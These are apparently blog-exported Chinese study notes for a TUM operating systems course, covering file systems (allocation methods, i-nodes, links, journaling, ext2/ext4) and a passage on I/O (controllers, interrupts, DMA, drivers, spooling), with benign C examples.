在这种访问下，进程需要按顺序读取文件中的字节（或记录），文件的部分内容不能跳过，适合磁带类存储设备。 比如说读一本书的时候只能一页一页往后翻，不能直接跳到第50页。 随机访问（Random-access）进程可以按任意顺序读取文件中的字节（或记录），在数据库系统中尤其重要（快速定位记录）。 UNIX 系统中，lseek 系统调用可以改变“读写指针”位置： 1lseek(fd, 1024, SEEK_SET); fd是文件描述符，1024是偏移量（offset）（单位是Byte），SEEK_SET 则是定位方式，有几种选择： 常量名 含义 SEEK_SET 从文件开头开始偏移 offset 字节 SEEK_CUR 从当前位置开始偏移 SEEK_END 从文件末尾开始偏移 （offset需要调整为负数） 例子： 12345678910111213141516171819202122232425262728293031#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; int fd; // 文件描述符 char buf[128]; // 缓冲区，用于读取128字节内容 // 打开文件 &quot;myfile.txt&quot;，只读方式 fd = open(&quot;myfile.txt&quot;, O_RDONLY); if (fd &lt; 0) // 如果打开失败，退出 return EXIT_FAILURE; // 将文件读写位置移动到从文件头开始的第1024个字节 if (lseek(fd, 1024, SEEK_SET) &lt; 0) return EXIT_FAILURE; // 从当前位置读取128字节到缓冲区buf中 if (read(fd, buf, 128) &lt; 0) return EXIT_FAILURE; // 打印读取到的内容 printf(&quot;%s\\n&quot;, buf); // 关闭文件 close(fd); // 正常退出 return EXIT_SUCCESS;&#125; 文件属性（Dateiattribute）每份文件除了文件名和文件内容外还会附带一些其他信息：元信息（Meta-Informationen）。 元信息包含： 对文件的访问权限 比如说在UNIX里，权限赋予对象分成 所有者（Owner）、用户组（Group）、所有人（All）。而权限种类有r（读取）、w（写入）、x（执行） 例子： 1-rwxr--r-- 标志位（flags）：控制文件的某些属性 比如说可以将文件设置为隐藏、标识为二进制或归档文件等。 详见： 文件操作（Datei-Operationen）常见的文件操作都是通过系统调用提供的： 创建和删除文件 open （打开）: 在访问一个文件之前，必须先打开它。这会让操作系统把文件属性和其他信息加载到内存中，方便快速处理。open() 系统调用返回一个文件描述符（file descriptor），这是一个小的整数，用来标识这个打开的文件。 unlink （删除） 后续对文件的访问（通过文件描述符） close （关闭） 使用文件描述符来关闭文件，释放内部数据结构资源。 read （读取） 指定要读取的数据以及一个缓冲区（buffer），读取的内容将被放入该缓冲区。 一定要提前创建一个缓冲区！ write （写入） 将数据写入到当前文件指针所在的位置，注意原有数据可能会被覆盖。 seek （定位） 移动文件指针到指定位置（之后可以从该位置读取或写入）。（见上面随机访问那里的例子） 代码例子： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // 包含 open() 的相关定义和文件权限#include &lt;unistd.h&gt; // 包含 read(), write(), close() 的声明#define BUF_SIZE 4096 // 定义缓冲区的大小int main (int argc, char *argv[]) &#123; int fd_in, fd_out, count; // 2个文件描述符 和 读写字节数计数器 char buf[BUF_SIZE]; // 缓冲区 // 如果参数个数不为3（程序名 + 输入文件 + 输出文件），则失败退出 if (argc != 3) return EXIT_FAILURE; // 打开输入文件，只读模式（O_RDONLY） if ((fd_in = open(argv[1], O_RDONLY)) == -1) return EXIT_FAILURE; // 打开或创建输出文件，只写模式，权限为用户可读写（rw- --- ---） if ((fd_out = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) == -1) return EXIT_FAILURE; // 读取输入文件的内容并写入到输出文件中，直到读完 while ((count = read(fd_in, buf, BUF_SIZE)) &gt; 0) &#123; // 如果写入失败或未能写入全部内容，返回失败 if (write(fd_out, buf, count) &lt;= 0) return EXIT_FAILURE; &#125; // 关闭两个文件描述符 close(fd_in); close(fd_out); return EXIT_SUCCESS; // 成功结束程序&#125; 目录（Verzeichnisse）文件系统通过目录来组织文件。而目录本质上是一个特殊的文件，它只包含管理信息（比如：文件名、路径、指针等）。目录使文件系统支持层级管理（hierarchische Verwaltung），让结构更清晰、查找更高效。 下面这两种是比较常见的目录结构： 1. 单层目录结构（Single-Level Verzeichnisstrukturen） 在这种结构里只有一个目录（根目录，root directory）用于存放所有文件。目前依然在一些嵌入式系统中使用。 优点：文件可以很快被找到（因为都在同一个地方）。 缺点：所有用户共享同一个目录，没有分层结构。 2. 层次型目录结构（Hierarchische Verzeichnisstrukturen） 这种会将相关的文件以分层方式组织在目录中，每个用户拥有自己专属的主目录，并可包含子目录。 路径名（Pfadnamen）路径名是为了在树状结构的文件系统中为文件命名，一般分3种： 1. 绝对路径名（Absolute Pfadnamen） 路径从根目录（Root-Verzeichnis）开始，一直到目标文件。 注意：UNIX/Linux 中用 / ，Windows 中用 \\ 。 例子： 1/tum/git/gbs/uebungsbetrieb/ws18/09/c-files/mem.c 2. 相对路径名（Relative Pfadnamen） 路径是相对于当前工作目录（Current Working Directory）而言的。 比如当前路径是 1/tum/git/gbs/uebungsbetrieb/ws18/09 的时候，就可以这样引用文件：123blatt09.pdf或者c-files/mem.c 3. 特殊路径 . 表示当前目录，.. 表示上一级目录。 例子： 假设当前路径是 1ws18/09/ 可以用 12cp ../08/gbsuebung.cls .# 从当前目录的上一级目录中的 08 子目录里，复制 gbsuebung.cls 文件到当前目录中 文件系统从现在开始我们从实现角度（Implementierungs-Sicht）来了解文件系统：它内部是如何实现各种功能的。 文件系统布局（Dateisystem-Layout）硬盘会被划分为多个分区（Partitionen），每个分区可以独立存储一个文件系统，彼此之间互不影响。 位于 Sektor 0 的是主引导记录（MBR，Master Boot Record）。里面存储了一个分区表（Partitions-Tabelle），用于纪录每个分区的起始和结束地址。 在启动电脑时（Booten），BIOS（或现代的 UEFI）会读取 MBR，执行 MBR 程序，然后根据分区表（Partitions-Tabelle）定位到活动分区（aktiven Partition），读取并执行该分区的第一个块 Boot Block 中的代码，引导操作系统加载。 每个分区内部的结构会随着文件系统的不同而变化。 上面图片里展示的是UNIX/Linux中文件系统的例子： 超级块（Superblock） 存储关于整个文件系统的关键信息，包括 Magic Number（识别文件系统类型的标识）, Anzahl der Blöcke, etc. 空闲块信息（Informationen über freie Blöcke） （上一章的内容）可以通过位图（Bitmap）或者指针链表（Pointer List）实现。 文件描述符集合（i-nodes） 文件和目录 文件的存储与实现方式（Implementierung von Dateien）文件系统管理那些用于保存文件内容的磁盘块（Blöcke），但每个文件的数据都被分成多个块，系统怎么样可以知道这些块在哪儿呢？ 以下是管理文件内容所用的三种主要实现方案： 连续分配（Contiguous Allocation）文件被视为硬盘上一串连续的块，也就是说文件的所有数据块在物理磁盘上是挨在一起的（如下图）。 优点： 实现简单（Einfache Implementierung） 读取性能高（Lesen ist sehr performant） 由于数据连续，只需一次磁头定位就可以一次性把整个文件读完，非常高效。 缺点： 外部碎片问题（Externe Fragmentierung） 指随着文件的创建与删除（也就是外部原因）会产生很多小块，导致很难找到一大块连续空间给新文件。（如下图所示） （interne Fragmentierung 指的是想Buddy Algorithm那样算法本身导致的碎片化。） 所以比较适合只读介质（Read-Only-Medien），比如说CD-ROM，DVD，BluRay-Disks 链式分配（Linked List Allocation）使用一个链表管理所以文件使用的块，每个块的开头包含指向下一个块的指针。 优点： 不会浪费空间 不像连续分配那样需要一整段连续空闲区域，所有零散的空闲块都可以利用 缺点： 随机访问性能差（Niedrige Performance bei Random-Access） 因为如果要访问第 n 块，必须先读取完前 n-1 块。 每个块要占用一点空间存指针 导致可用空间不是标准的 2 的幂（keine 2er-Potenz）。 与操作系统块大小兼容性差 因为许多系统要求块大小是固定的（例如 512B、1024B、2048B 等），指针占了空间后可能导致不便于按块读取。 针对提到的这些问题我们可以在此基础上进行一点改良： FAT 文件分配表（Linked List Allocation mit File Allocation Table）我们现在将所有指针集中存储在一张表中（FAT），放在主存（Hauptspeicher）中管理。 例子： 我们现在有2份文件： A：4, 7, 2, 10, 12 (-1 = Ende der Liste) B: 6, 3, 11, 14 (-1) 优点： 每个块不会浪费存储空间（kein Verschnitt） 随机访问（Random-Access）更快 只需要在内存中操作表即可 缺点： FAT 表必须常驻内存（RAM），会消耗大量内存。（磁盘空间越大FAT也越大） i-nodes（索引节点）每个文件都由一个i-node数据结构来表示，i-node中会包含文件的元数据（Dateiattribute）以及磁盘块的地址（ Adressen）。 优点： 内存占用低 因为只需将打开的文件的i-node加载到内存中。 可扩展性强 所需内存空间只与“同时打开的文件数”有关，而不是整个磁盘容量。 缺点： i-node 能存的地址数量是固定的 为了解决这个问题可以用多级间接地址： 比如说一级间接、二级间接、三级间接（Indirekte, doppelt indirekte und dreifach indirekte Blöcke），即最后的地址不是数据块，而是指向一个包含更多地址的“块地址表”（即指针块）。 目录（Verzeichnissen）操作系统需要通过解析路径名来找到硬盘上的实际文件位置。 一个目录其实就是一组目录项（Verzeichniseintrag，directory entry）的集合。当操作系统通过一个路径打开文件时，会挨个查找对应的目录项。 一个目录项会包含以下信息： 文件名 定位信息（Adress-Informationen, um die gesuchte Datei zu lokalisieren） 文件属性（Datei-Attribute） （注意，目录项和文件是2个不同的东西。目录项实际上只是一条纪录，用于指向一个文件或者子目录，并不会存储文件内容（用于导航）。而文件是实际存储数据的对象） 文件属性的存储有2种常见的方式： 1. 直接存储在目录项中： 每个目录项不仅包含文件名，还直接包含这个文件的属性信息。 2. 存储在 i-nodes 中： 每个目录项只包含文件名以及一个指向 i-node 的引用（编号或指针），文件的所有属性都集中保存在 i-node 中。 文件名的存储因为我们希望可以使用任意长度的文件名，所以需要考虑这些不同长度的文件名该怎么存储。 首先想到的便是 1. 固定文件名长度，比如说限制每份文件的文件名在255个字符以内。但是这样一来肯定需要给每份文件的文件名255个字符的位置，由于不是每份文件的名字都有这么长，很容易导致内存或者磁盘空间的浪费。 所以我们可以根据这个问题将这个方法改良一点： 2. 允许文件使用任意长度的文件名，然后专门用一块空间记录当前文件名的长度。（如下图） 但是这种方法同样也有一个很大的问题：因为文件名长度的不同意，创建和删除文件容易导致存储空间碎片化。为了解决这个问题我们可以考虑将所有的文件名集中存储，也就是: 3. 只存储文件属性以及一个指向堆（Heap）里存储文件名位置的指针。（如下图） 尽管已经改善很多了，但这个方案依旧不够完美：在包含大量条目的目录中查找文件会很慢（Suchen von Dateien in Verzeichnissen mit vielen Einträgen ist langsam）。所以我们可以 4. 在3的基础上引入哈希表来提高索引效率： 在每个目录中使用一个哈希表，通过对文件名进行哈希计算来得到目录项的索引。目录项中的哈希冲突（Kollisionen）则通过链表来处理。 链接（Links）为了让（不同）用户在不同路径下可以打开同一份文件，我们需要引入链接这个机制。 链接分为2种： 硬链接（Hard Links） 目录项不是直接指向文件数据，而是指向i-node，允许多个目录项指向同一个 i-node。注意，在硬链接里没有“主链接”或“次链接”的区别，所有硬链接是平等的。每个 i-node 会记录引用计数（ref count），当引用计数归零时，说明没有目录再指向它，就可以删除这个文件了。 （这也解释了 UNIX 删除命令叫 unlink()，因为它实际上是取消一个目录项到 i-node 的链接，而不是马上删除文件。） 软链接/符号链接（Symbolic Links）创建一个特殊类型的文件，里面保存的是目标文件的路径名。 软链接类似于Windows里的快捷方式，但并不完全一样。软连接是文件系统级别支持，而快捷方式则是应用层支持。这意味着系统层面会自动解析软链接，但是Windows里的快捷方式需要Shell或资源管理器解析。 日志文件系统（Journaling-Dateisysteme）主要是为了保证系统崩溃后的数据一致性，类似于Datenbank里的Transaktionsverwaltung。 在 UNIX 下删除一个文件需要3个步骤： 从目录中移除文件的目录项（Entferne die Datei aus ihrem Verzeichnis） 将文件对应的 i-node 释放（Gib den i-node in den Pool der freien i-nodes frei） 将文件占用的磁盘数据块标记为“可用”（Markiere alle von der Datei belegten Festplatten Blöcke als frei） 但如果在某一步结束后系统发生了崩溃，就会导致很严重的问题，比如说数据丢失或者是空间泄露。 所以我们需要日志文件系统（Journaling-Dateisysteme）来预防这些问题：会先将所有对文件系统的更改操作记录在日志区域（Journal）中，然后才实际执行。这样一来所有操作都可以从日志中恢复或重做，确保一致性。 具体操作流程： 首先创建一个日志条目，描述即将执行的三项操作。（Erstellen eines Log-Eintrags, der die drei Operationen beschreibt） 将该日志写入磁盘的日志区。（Speicherung in Journal auf der Platte） 然后需要重新读取日志内容以确认是否正确写入。 执行实际的3步操作。（Ausführen der drei Operationen） 每完成一步操作，都在磁盘上记录一次“进度”，表示该操作已完成。（Abschluss jeder Operation auf der Platte vermerkt: Fortschrittsbericht） 三个操作都成功完成后，删除日志条目。 然后在系统重启或者发生崩溃后会进行以下操作： 首先检查日志内容。（Inspektion des Journals） 如果发现某个操作没执行完，那么会重新执行所有操作。 只不过这些都一个共同的前提：所有操作必须是幂等的（idempotent），即进行1次操作与进行n次（相同的）操作得到的结果是一样的。 例子： 将一块Block标记成frei：是idempotent的。 把空闲块简单地加到“空闲块列表末尾”：不是idempotent的，需要改成 先检查一下块n是否已经在空闲列表中，如果没有，再加入。 还有一个办法也可以提高文件系统的可靠性（Erhöhung der Zuverlässigkeit）：把多个操作包装成一个原子事务（atomaren Transaktion，即 ganz oder gar nicht）。 虚拟文件系统（Virtual File System，VFS）为了系统的兼容性需求（不同的操作系统和设备可能使用不同的文件系统格式）以及多样化的应用场景，一般的操作系统都会支持多种文件系统。 比如在 Windows 下，可以同时有 NTFS、FAT32、CD-ROM 等文件系统。 Windows会将每个文件系统会被分配一个独立的盘符（如 C:、D:），而类 Unix 系统则是将所有文件系统整合到一个统一的层级结构中，对用户完全透明。 Unix的这个整合是便通过虚拟文件系统（Virtual File System，VFS）实现的。 VFS负责提供一个（遵循 POSIX 标准的）统一的接口（比如 open、read、write、lseek等），用于支持在一个本地系统中接入多种不同的文件系统。 图示： 优化策略（Optimierung）Buffer Cache（缓冲区缓存）（这部分ERA的Cache那一章会详细讲。） 文件系统使用内存中的一部分作为缓存区域，来暂存磁盘上的数据块。 对于读的操作的处理流程： 先检查所需的数据块是否已经在缓存中？如果是，就跳到步骤3 如果不在缓存中：就从磁盘读取这个块，并加载到缓存中 返回这个数据块的内容给调用者（用户进程） 当缓存空间不够时也需要替换策略（Ersetzungsstrategie）。 进行写的操作时数据会先写入缓存区，不一定立刻写入磁盘。在Unix中可以使用 sync 命令手动将缓存区内容写入磁盘，不过系统自己也会会周期性自动执行（例如每30秒由 update 守护进程（daemon）完成）。Windows采用的则是 Write-thru Cache，即写操作会立即同步到磁盘。 预读（Read-Ahead）预读指的是提前把即将需要的数据块加载到缓存中，以此来提高读取性能。 可以 简单预测，或者 即假设用户会按顺序进行读取，比如说在用户请求读取某个文件的第 k 块时，就先检查第 k+1 块是否已在缓存中。如果不在缓存，就提前加载第 k+1 块。 结合结合文件的访问历史进行预测 给文件设置一个属性，记录它是否是被顺序读取。如果确认是顺序访问，才启用 Read-Ahead。 减少磁盘读写头的移动 尽量让同一文件的块物理上靠得更近 比如存储在同一个磁柱（Zylinder）上的Blöcken里。 块组分配（Verwaltung von Blöcken in Gruppen） 不按单个块分配，而是每次分配2个或4个块。这样可以隐式地提高局部性（Lokalität）。 i-node 结构不要都集中在分区开头（i-nodes nicht (nur) am Anfang der Partition） 碎片整理（Defragmentierung）将文件的所有块重新排列，使它们尽可能连续，提高访问效率。（Neugruppierung der Blöcke der Dateien auf der Festplatte） 例子Linux的ext2ext2会将硬盘分区划分为“块组”结构（Aufteilung der Festplatten-Partition in Block-Gruppen）。 Block 0 是预留给系统启动用的（System-Bootup-Vorgang）。 而其余的所有Block-Gruppen都包含以下信息： 超级块（Superblock）： 包含有关文件系统布局的信息，比如说 i-node和数据块的总数、空闲块列表的指针等。 （Anzahl der i-nodes und Blöcke, Pointer zur Liste mit freien Blöcken, etc.） 组描述符表（Gruppen-Deskriptor-Tabelle）： 包含这个块组的信息，比如说Bitmap的位置、空闲的 i-node 和数据块的数量、目录的数量等。 （Position der Bitmaps, Anzahl freie i-nodes und Blöcke, Anzahl der Verzeichnisse） 两个位图（Bitmaps）： 每个Bitmap都是一个Block的大小，记录空闲块以及 i-nodes。通过这个Bitmap可以找到空闲的块以及i-nodes。 i-nodes Datenblöcke （这些Block groups都是ext2管理的空间） ext2中打开文件时，系统会在目录里查找该文件的i-node信息： 首先从目录条目（Verzeichniseintrag）中获取 i-node 编号（i-node-Nummer），通过该编号可以在硬盘上的 i-node 表中找到该文件的 i-node，并将其加载到内存中。 然后 i-node 会被写入内存中的 i-node 表。 i-node 表包含了所有已打开的文件和目录的 i-nodes。 目录文件结构图示： Linux的ext4ext4则是在ext2的基础上加了 journaling 日志机制。这里的日志是一个文件，它会通过一个环形缓冲区（ring buffer）来实现。日志由一个独立于文件系统的层管理，叫做 Journaling Block Device（JBD）。 JBD中支持以下几种数据结构： 日志记录（Log-Eintrag (Log Record)） 描述低等级的修改操作。 Beschreibt eine Low-level-Dateisystem-Operation, die einen Block modifiziert. 原子操作句柄（Atomic Operation Handle） 会将一组相关的日志记录组合在一起，并原子性地执行。（Gruppiert mehrere zusammengehörige Log-Einträge und führt sie atomar aus） 比如说 write 一般会涉及修改i-node、数据块、空闲块列表等信息，而这些操作应当作为一个整体 原子性执行（atomar als Einheit ausgeführt werden）。 事务（Transaktionen） JBD会将多个原子操作作为事务处理。一组日志记录只有在相关的所有实际写入操作都完成后，才能从日志中移除。 （这些内容在之前的日志文件系统（Journaling-Dateisysteme）都讲过，跟Datenbank里的也差不多。） ext4同样改进了将块映射到文件的方式：在ext2/3中都是使用指针指向单个块（Direkte und ein-/zwei-/dreifach indirekte Blöcke），这样一来如果块的数量过多可能会导致指针数量也过多。所以ext4采用的是Extents： Instead of storing a list of every individual block which makes up the file, the idea is to store just the address of the first and last block of each continuous range of blocks. These continuous ranges of data blocks (and the pairs of numbers which represent them) are called extents. （这段解释是这里来的：https://unix.stackexchange.com/questions/223310/what-do-extents-feature-do-in-ext4-filesystem-in-linux） 图示：","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe 输入/输出","slug":"TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出","date":"2025-03-20T19:20:11.000Z","updated":"2025-04-01T21:47:24.340Z","comments":true,"path":"2025/03/20/TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出/","permalink":"https://archer-baiyi.github.io/2025/03/20/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"操作系统基础相关笔记","text":"设备大致可以分为2类： 块设备（Blockorientierte Geräte，block devices）： 内容是可寻址的（adressierbar）； 数据以固定大小的块存储（in Blöcken fester Größe von 29 Byte bis 216 Byte）； 可以随机访问（Random Access）每个块； 例子：蓝光光盘（Blu-ray Disc）、硬盘（HDD）、固态硬盘（SSD）。 字符设备（Zeichenorientierte Geräte，character device）： 串行数据传输（serieller Datentransfer）：指每次传输一个比特数据，并连续进行以上单次过程的通信方式； 不可寻址的； 发送和/或接收字符流（Zeichenströme）； 例子：鼠标，键盘，打印机。 （其他）： 比如说时钟（生成中断信号 erzeugt Unterbrechungen），显示器等。 拿键盘举例，我们每次敲击按键了之后它都会将这个信息直接传输到电脑，而不是等我们输入了一长串内容之后再将这段内容一起发送给电脑，所以是serieller Datentransfer。而与serieller Datentransfer相对的则是parallele Datenübertragung。 E/A System 的分层结构： 控制器（Controller）：设备硬件的一部分；作为CPU和设备之间的接口。 中断处理程序（Interrupt-Handler）：处理设备的反馈信息（中断）。 设备驱动程序（Gerätetreiber）：执行与设备相关的控制软件；驱动程序通过控制器访问设备。 设备无关软件（Geräteunabhängige Software）：分配设备、数据缓冲等功能。 用户级软件（User-Level-Software）：用于输入/输出（E/A）的库函数，例如假脱机（Spooling）。 以惠普（HP）打印机为例来明确一下每层的具体内容： 控制器：HP 打印机的主控制芯片 惠普打印机内部有专门的 控制芯片，负责管理打印作业、处理数据，并控制墨盒或激光成像单元的工作。 中断处理程序：负责处理打印机状态反馈（如“缺纸”或“墨盒不足”）的程序 当打印机遇到 缺纸、卡纸、墨水不足 等问题时，会发送中断信号给计算机，让操作系统暂停当前任务并处理异常。 设备驱动程序：HP 打印机驱动程序 点击“打印”时，驱动程序会把文本或图像转换成 HP 打印机能理解的格式（如 PCL、PostScript），然后发送给打印机。 设备无关软件：Windows/Linux 的打印管理系统 这层软件不依赖于具体的打印机品牌，而是为所有打印设备提供统一的管理功能，如： 排队管理（多个打印任务排队执行） 数据缓冲（避免 CPU 直接等待打印机完成任务，提高效率） 用户级软件：用户直接使用的应用程序，它们调用系统级打印服务完成任务。例如：Microsoft Word，HP Smart App。 接下来我们看一下每一层的具体功能： 控制器（Controller）什么是控制器？ 输入/输出设备（E/A-Geräte） 由机械组件和电子组件组成，其中电子组件就是设设备控制器（Geräte-Controller）。它是连接 CPU 和外部设备的桥梁。 Controller besitzt Hardware-Schnittstelle zum Gerät. 控制器包含寄存器（Register），用于与 CPU 进行通信： 数据传输：操作系统（BS）向寄存器写入数据。 查询设备状态：操作系统 读取寄存器内容。 附加功能：控制器提供数据缓冲区（Datenpuffer），用于存储传输中的数据，以提高效率。 设备控制器（Geräte-Controller）的主要任务： 设备管理（Steuerung der beweglichen Hardware） 处理来自驱动的命令（Befehle ausführen） 与CPU进行交互（Kommunikation mit CPU） 发送中断信号（Interrupts melden） 缓冲数据（Daten puffern） 交互计算机与设备控制器（Controller）交互主要有两种方式： I/O-Ports： 早期计算机使用 I/O 指令和I/O 端口与设备通信。 Memory-Mapped I/O： 将设备的寄存器直接映射到系统内存地址空间，这样 CPU 可以通过普通的 LOAD/STORE 指令来访问设备。 早期的计算机需要手动设置设备地址，使用 跳线（Jumper） 或 DIP 开关。而现代设备支持 Plug &amp; Play，系统能够自动分配 I/O 端口地址 和 中断（IRQ）。 数据交换第一种方法： 程序控制 I/O（Programmed I/O）CPU会直接控制与设备的交互。 比如说向打印机发送数据需要进行以下步骤： 将数据复制到内核 内核逐个字符发送到打印机 传输字符 $N$ 等待打印机确认字符 $N$ 继续发送字符 $N+1$ 这样做的坏处非常显而易见：忙等待（Busy Waiting）。CPU会被卡死在这里不能完成其他的任务。 代码示例： 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // 忙等待 *printer_data_register = p[i]; // 只发送一个字符&#125; 更好的办法： 中断（Interrupts）流程如下： 设备通过信号通知CPU，表明其I/O操作已完成。 中断控制器（Interrupt Controller Chip）识别信号，并通知CPU。 操作系统（BS）暂停当前进程，切换到内核模式（Kernel Mode）。 在内核中执行中断处理程序（Unterbrechungsbehandlungsroutine） 设备驱动程序（Gerätetreiber）负责提供中断处理程序（Unterbrechungsbehandlungsroutine），但中断处理的执行由操作系统管理。 中断处理程序（Handler） 执行完成后便会通知操作系统。 操作系统将等待（wartenden）I/O 的进程恢复到可运行状态（rechenwillig）。 这个流程可以分为2部分： 同步系统调用（Systemcall） 传递 I/O 参数，启动 I/O 操作。 调用后，进程进入睡眠状态（等待 I/O 完成），释放 CPU。 Interrupt-Handler 逐步处理 I/O 操作。 I/O 完成后，唤醒等待的进程。 代码示例： 1. Systemcall： 12345copy_from_user(buffer, p, count); // 从用户空间复制数据到内核enable_interrupts(); // 允许中断while (*printer_status_reg != READY); // 轮询等待打印机准备就绪*printer_data_register = p[0]; // 发送第一个字符到打印机scheduler(); // 调度其他进程 2. Interrupt-Handler： 123456789if (count == 0) &#123; unblock_user(); // 唤醒等待的进程&#125; else &#123; *printer_data_register = p[i]; // 发送下一个字符 count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // 确认中断已处理return_from_interrupt(); 用这个方法的话CPU 可在 I/O 期间执行其他任务，不需要一直等待。但是会一直触发Interrupt，可能会影响性能。 所以此之上还有一种更好的办法： 直接内存访问（Direct Memory Access, DMA）使用 DMA 控制器，允许直接访问内存，而无需 CPU 介入。可以有效解决通过寄存器作为中间存储器传输数据消耗大量 CPU 计算周期的问题。 传输流程： CPU 初始化 DMA （Programmiert DMA-Register (Speicher- und Gerätadressen, Parameter)）； 磁盘控制器（ Disk-Controller）将数据放入缓冲区（Puffer）； DMA 控制器从磁盘（Disk）读取数据，并直接存入主存（RAM）（DMA-Controller initiiert die Übertragung von Disk in RAM）； 磁盘控制器（ Disk-Controller）发送确认（ACK）。 操作系统（BS）继续处理内存中的数据（ weiterverarbeiten bzw. weitergeben） 流程结束之后才会发送Interrupt。 之前是传输每个数据（每个字符）都会触发一次Interrupt，现在是传输整个数据块只会触发一次。 数据缓冲（Puffern von Daten）缓冲的主要作用是解耦（Entkopplung）用户程序和设备。相当于提供一个中间层。 （解耦指的是减少两个系统组件之间的直接依赖关系。） 缓存分以下几种类型： 无缓冲（Ohne Puffer）： 用户进程必须自己存储 I/O 数据，并且数据必须始终驻留在进程的内存中，直到 I/O 操作完成。 简单缓冲（Einfacher Puffer）： 进程仍然必须快速取走数据，否则缓冲区会满，影响数据流。 双缓冲（Doppelter Puffer）： 一个缓冲区正在被读取（geleert）的同时另一个缓冲区会正在被写入（gefüllt）。清空速度必须足够快，否则会导致数据堆积。 环形缓冲（Zirkulär / Ringpuffer）： 扩展双缓冲的概念，使用多个缓冲区（k 个缓冲区）。可以适应不同的负载和处理速度，提高数据吞吐率。 会使用2个指针来管理数据：写指针和读指针。 有时可能会存在多个级别的缓冲，比如说：Nutzerprozess, Kern, Gerätetreiber, Gerätecontroller, … 设备驱动程序（Geräte-Treiber）设备驱动程序（Geräte-Treiber，Device Driver） 是操作系统中用于控制硬件设备的软件模块（Software-Module）。它充当 BS 和设备（尤其是Controller）之间的桥梁，让系统能够识别和管理外部设备。 驱动具有以下特点： 针对特定设备类型（Gerätetyp-spezifisch） 它了解相应设备的指令集（即控制设备的命令），以便和controller进行交互。 一个驱动程序可适用于多个同类设备 比如说USB驱动会支持所有的USB设备。 驱动充当BS 和设备（尤其是Controller）之间的桥梁指的是它可以： 查询设备状态（Gerätezustand abfragen） 向设备发送命令（Befehle an das Gerät zu übermitteln） 与设备进行数据交换（Daten mit dem Gerät auszutauschen） 同样，驱动也可能存在子结构（Unterstruktur），比如说USB。 驱动的主要任务： 定义设备并向操作系统注册，并激活设备。（definiert das Gerät gegenüber dem BS, aktiviert das Gerät） 在系统启动时初始化控制器和设备。（initialisiert den Controller und das Gerät beim Systemstart） 转换I/O 请求，使其变为设备可理解的指令。（wandelt E/A-Anforderungen in gerätespezifische Befehle um） 响应（来自设备或控制器的）硬件信号。（antwortet auf Hardwaresignale des Geräts bzw. des Controllers）（比如说 Interrupt handling） 报告设备和控制器的错误（错误检测和日志记录）。（meldet Geräte- und Controller-Fehler） 传输设备与操作系统之间的数据和状态信息。（überträgt Daten und Zustandsinformation vom/zum Gerät） 缓冲输入/输出数据，优化数据传输性能。（提供Buffer）（puffert Daten bei Ein- und Ausgabe） 设备驱动是如何与设备控制器协作的？ 驱动程序发送命令到设备控制器，并在等待期间阻塞自身（防止 CPU 过度轮询）。（Treiber schickt Kommandos zum Controller und blockiert sich） 控制器处理数据并在传输完成后发送信号（通知数据交换已完成）。（Controller signalisiert das Ende des Datenaustausches） 中断处理程序（Interrupt-Handler）解除驱动的阻塞状态，例如通过信号量（Semaphore） 让进程恢复运行。（Der Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)） 驱动程序处理收到的数据或继续发送新数据。（Treiber verarbeitet empfangene Daten bzw. schickt weitere Daten） 设备无关的软件（Geräte-unabhängige Software）设备无关的软件的目的是简化驱动程序的编程（Vereinfachte Treiber-Programmierung），并便于集成新的驱动程序软件（Einfache Einbindung neuer Treiber-Software）。 设备无关软件的主要任务： 在设备驱动程序和操作系统之间建立标准接口。（Bereitstellung einer einheitlichen Schnittstelle zwischen Gerätetreibern und dem Rest des Betriebssystems） 缓冲 如果缓冲不由驱动管理，则由设备无关的软件负责。 错误处理（Fehlerbehandlung） 除了驱动程序本身的错误处理外，还提供额外的错误管理机制。 设置设备无关的参数（Festlegung geräteunabhängiger Parameter） 比如说块设备（Blockgerät）使用的块大小（Blockgröße） 用户级软件（User-Level-Software）系统库（Systembibliothek）通常会直接给用户提供E/A的编程接口。 比如说： open()： 打开设备的逻辑通道，返回一个 文件描述符（Descriptor 或 Handle），供后续操作使用。 read()： 从设备读取数据，返回指定数量的字节流（Bytestream）。 close()： 关闭先前打开的通道，释放相关的系统资源。 write()： 向设备写入数据，发送指定数量的字节到设备。 ioctl()： 改变设备的操作模式，比如调整串行端口的传输速率或者是修改设备的控制参数 除了这些标准库函数，还有： 假脱机（Spooling）由于在现实生活中，我们经常会有多个进程同时提交I/O请求，比如说用一台打印机打印多份文件。这个时候就需要想办法协调资源的使用，避免出现冲突。 什么是 Spooling？ Spooling（Simultaneous Peripheral Operations Online，同步外设操作） 是一种用于管理独占（）exklusiv nutzbar)设备（如打印机）访问的缓冲机制。 在这个机制下，进程不会直接访问设备，而是将任务交给 Spooler Daemon（假脱机守护进程） 处理。只有 Spooler Daemon 